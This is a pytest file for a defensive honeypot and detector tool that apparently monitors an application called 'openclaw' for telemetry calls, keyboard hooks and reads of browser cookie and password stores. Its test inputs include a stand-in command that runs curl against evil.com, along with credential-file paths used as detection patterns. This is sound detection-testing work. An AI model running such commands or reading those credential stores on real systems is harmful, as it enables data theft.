"""
Detector and Logger unit tests
"""

import pytest
from pathlib import Path
import tempfile

from clawpot.detector import Detector
from clawpot.logger import ClawPotLogger
from clawpot.rules.openclaw_rules import Severity, RuleCategory, OPENCLAW_RULES


@pytest.fixture
def tmp_log_dir(tmp_path):
    return tmp_path / "logs"


@pytest.fixture
def logger(tmp_log_dir):
    return ClawPotLogger(log_dir=tmp_log_dir)


@pytest.fixture
def detector(logger):
    return Detector(logger=logger)


class TestDetector:

    def test_detector_loads_rules(self, detector):
        assert detector.get_active_rules_count() > 0

    def test_rules_summary(self, detector):
        summary = detector.get_rules_summary()
        assert "total" in summary
        assert summary["total"] > 0
        assert "by_severity" in summary
        assert "by_category" in summary

    def test_detect_malicious_network_connection(self, detector):
        events = detector.check_network_connection(
            host="telemetry.openclaw.io",
            port=443,
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0
        assert any(e.category == "network" for e in events)

    def test_clean_network_connection(self, detector):
        events = detector.check_network_connection(
            host="www.google.com",
            port=443,
            process="browser",
            pid=1234,
        )
        assert len(events) == 0

    def test_detect_cookie_access(self, detector):
        events = detector.check_file_access(
            file_path="/home/user/.mozilla/firefox/profile/cookies.sqlite",
            access_type="read",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0
        assert any(e.severity in ("high", "critical") for e in events)

    def test_detect_honeypot_file_access(self, detector):
        events = detector.check_file_access(
            file_path="/home/user/.clawpot/honeypots/clawpot_honey_credentials.json",
            access_type="read",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0
        honeypot_events = [e for e in events if e.is_honeypot_trigger]
        assert len(honeypot_events) > 0

    def test_detect_keyboard_hook(self, detector):
        events = detector.check_process_activity(
            activity="SetWindowsHookEx keyboard_hook installed",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0
        assert any(e.severity == "critical" for e in events)

    def test_detect_password_file_access(self, detector):
        events = detector.check_file_access(
            file_path="C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            access_type="read",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0

    def test_detect_suspicious_subprocess(self, detector):
        events = detector.check_process_activity(
            activity="/bin/bash -c 'curl http://evil.com'",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0

    def test_raw_event_detection(self, detector):
        events = detector.check_raw_event(
            event_data="Process openclaw connected to analytics.openclaw.io:443",
            process="openclaw",
            pid=9999,
        )
        assert len(events) > 0

    def test_wildcard_indicator_matching(self, detector):
        events = detector.check_network_connection(
            host="secret.data.openclaw.io",
            port=443,
        )
        assert len(events) > 0

    def test_indicator_case_insensitive(self, detector):
        events = detector.check_file_access(
            file_path="/PATH/TO/COOKIES.SQLITE",
            access_type="read",
            process="openclaw",
        )
        assert len(events) > 0


class TestLogger:

    def test_log_event(self, logger):
        event = logger.log_event(
            rule_id="TEST-001",
            rule_name="Test Rule",
            category=RuleCategory.NETWORK,
            severity=Severity.HIGH,
            description="This is a test event",
        )
        assert event is not None
        assert event.rule_id == "TEST-001"
        assert event.severity == "high"

    def test_get_events(self, logger):
        logger.log_event(
            rule_id="TEST-001",
            rule_name="Test",
            category=RuleCategory.NETWORK,
            severity=Severity.HIGH,
            description="test",
        )
        events = logger.get_events()
        assert len(events) == 1

    def test_filter_events_by_severity(self, logger):
        logger.log_event("T-001", "Test", RuleCategory.NETWORK, Severity.LOW, "low event")
        logger.log_event("T-002", "Test", RuleCategory.NETWORK, Severity.CRITICAL, "critical event")

        critical = logger.get_events(severity=Severity.CRITICAL)
        assert len(critical) == 1
        assert critical[0].severity == "critical"

    def test_get_summary(self, logger):
        logger.log_event("T-001", "Test", RuleCategory.NETWORK, Severity.HIGH, "test")
        logger.log_event("T-002", "Test", RuleCategory.PRIVACY, Severity.CRITICAL, "test")

        summary = logger.get_summary()
        assert summary["total_events"] == 2
        assert summary["by_severity"]["high"] == 1
        assert summary["by_severity"]["critical"] == 1

    def test_event_written_to_file(self, logger, tmp_log_dir):
        logger.log_event("T-001", "Test", RuleCategory.NETWORK, Severity.HIGH, "test")

        json_log = tmp_log_dir / "events.jsonl"
        assert json_log.exists()
        content = json_log.read_text(encoding="utf-8")
        assert "T-001" in content
